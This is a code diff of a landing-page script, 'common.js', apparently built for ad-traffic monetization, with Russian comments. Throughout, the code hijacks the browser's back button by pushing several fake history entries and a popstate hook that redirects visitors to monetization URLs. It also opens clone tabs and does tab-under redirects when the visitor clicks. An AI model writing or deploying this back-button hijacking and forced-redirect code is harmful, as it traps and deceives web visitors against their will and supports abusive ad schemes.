@@ -1,4 +1,4 @@
-/* common.js — FINAL FIXED (Chest Lost = Clone) */
+/* common.js — FINAL FIXED VERSION (Back/Reverse/Clone) */
 
 (() => {
   "use strict";
@@ -109,7 +109,9 @@
     try {
       const n = Math.max(0, parseInt(count, 10) || 0);
       const originalUrl = window.location.href;
-      for (let i = 0; i < n; i++) { window.history.pushState({ __isBack: true }, "Please wait...", url); }
+      for (let i = 0; i < n; i++) { 
+        window.history.pushState({ __isBack: true }, "Please wait...", url); 
+      }
       window.history.pushState(null, document.title, originalUrl);
     } catch (e) {}
   };
@@ -117,14 +119,19 @@
   const initBackFast = (cfg) => {
     const b = cfg?.back?.currentTab;
     if (!b) return;
-    // Исправлено: если в конфиге нет пути, берем back.html в корне
+
+    // Авто-определение пути к back.html в корне
     const pageUrl = cfg.back?.pageUrl || "back.html";
     const page = new URL(pageUrl, window.location.origin + window.location.pathname);
+    
     const qs = buildExitQSFast({ zoneId: b.zoneId });
     if (b.url) qs.set("url", String(b.url));
-    else { qs.set("z", String(b.zoneId)); qs.set("domain", String(b.domain || cfg.domain || "")); }
+    else { 
+      qs.set("z", String(b.zoneId)); 
+      qs.set("domain", String(b.domain || cfg.domain || "")); 
+    }
     page.search = qs.toString();
-    pushBackStates(page.toString(), cfg.back?.count ?? 10);
+    pushBackStates(page.toString(), cfg.back?.count ?? 8);
   };
 
   const resolveUrlFast = (ex, cfg) => {
@@ -140,14 +147,8 @@
     
     const ct = ex.currentTab; 
     const nt = ex.newTab;     
-    
     const ctUrl = resolveUrlFast(ct, cfg);
     const ntUrl = resolveUrlFast(nt, cfg);
-
-    safe(() => {
-      if (ctUrl) window.syncMetric?.({ event: name, exitZoneId: ct?.zoneId });
-      if (ntUrl) window.syncMetric?.({ event: name, exitZoneId: nt?.zoneId });
-    });
 
     if (withBack) initBackFast(cfg);
     if (ntUrl) openTab(ntUrl);
@@ -159,7 +160,6 @@
     if (!ex) return;
     const url = resolveUrlFast(ex, cfg);
     if (!url) return;
-    safe(() => window.syncMetric?.({ event: name, exitZoneId: ex.zoneId }));
     if (withBack) { initBackFast(cfg); setTimeout(() => replaceTo(url), 40); }
     else { replaceTo(url); }
   };
@@ -169,12 +169,12 @@
     return runExitCurrentTabFast(cfg, name, true);
   };
 
-  // --- REVERSE ---
+  // --- REVERSE (Popstate hook) ---
   const initReverse = (cfg) => {
     if (!cfg?.reverse?.currentTab) return;
     safe(() => window.history.pushState({ __rev: 1 }, "", window.location.href));
     window.addEventListener("popstate", (e) => { 
-        // Если это не наш внутренний бэк-стейт, триггерим редирект
+        // Если это физический бэк, а не наш стейт — льем на реверс
         if (!e.state || !e.state.__isBack) {
             runExitCurrentTabFast(cfg, "reverse", false); 
         }
@@ -206,14 +206,12 @@
         return;
     }
     const cloneUrl = buildCloneUrl();
-    safe(() => window.syncMetric?.({ event: "micro_open_clone" }));
     openTab(cloneUrl);
 
     const ex = cfg?.tabUnderClick?.newTab || cfg?.tabUnderClick?.currentTab;
     const monetUrl = resolveUrlFast(ex, cfg);
 
     if (monetUrl) {
-      safe(() => window.syncMetric?.({ event: "tabUnderClick" }));
       initBackFast(cfg);
       setTimeout(() => replaceTo(monetUrl), 40);
     } else {
@@ -229,27 +227,17 @@
     document.addEventListener("click", (e) => {
       const zone = e.target?.closest?.("[data-target]");
       const t = zone?.getAttribute("data-target") || "";
-      const modal = document.getElementById("xh_exit_modal");
-      const banner = document.getElementById("xh_banner");
 
       if (isClone) {
         if (fired) return;
         fired = true;
-        e.preventDefault(); e.stopPropagation(); e.stopImmediatePropagation();
+        e.preventDefault(); e.stopPropagation();
         run(cfg, "mainExit");
         return;
       }
 
-      if (!t && document.documentElement.dataset.landingName === "chest") return;
-
-      if (t === "banner_main") {
-        e.preventDefault(); run(cfg, "mainExit"); return;
-      }
-      
       if (microTargets.has(t)) {
         e.preventDefault(); e.stopPropagation();
-        if (banner) banner.style.display = "none";
-        if (modal) modal.style.display = "none";
         runMicroHandoff(cfg);
         return;
       }
@@ -268,7 +256,7 @@
 
     window.LANDING_EXITS = { cfg, run: (name) => run(cfg, name) };
     
-    // ПРАВКА: Вызываем инициализацию Бэка сразу при загрузке!
+    // ПРАВКА: Инициализируем Бэк-фикс СРАЗУ при загрузке
     initBackFast(cfg); 
     
     initClickMap(cfg);
